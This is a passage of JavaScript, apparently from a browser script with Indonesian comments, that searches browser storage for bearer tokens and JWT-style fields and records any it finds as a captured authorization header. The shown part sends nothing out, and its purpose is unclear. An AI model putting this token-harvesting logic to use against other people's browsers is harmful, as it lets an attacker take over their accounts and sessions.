                    const token = value.replace(/^Bearer\s+/i, '').trim();
                    setCapturedAuth('Bearer ' + token);
                    logTerminal(`Token ditemukan dari storage key: ${key}`, 'success');
                    return true;
                }

                // Token di dalam JSON storage
                try {
                    const parsed = JSON.parse(value);
                    const possibleKeys = [
                        'token',
                        'accessToken',
                        'access_token',
                        'jwt',
                        'authorization',
                        'Authorization'
                    ];

                    for (const k of possibleKeys) {
                        if (parsed && parsed[k]) {
                            let token = String(parsed[k]).trim();

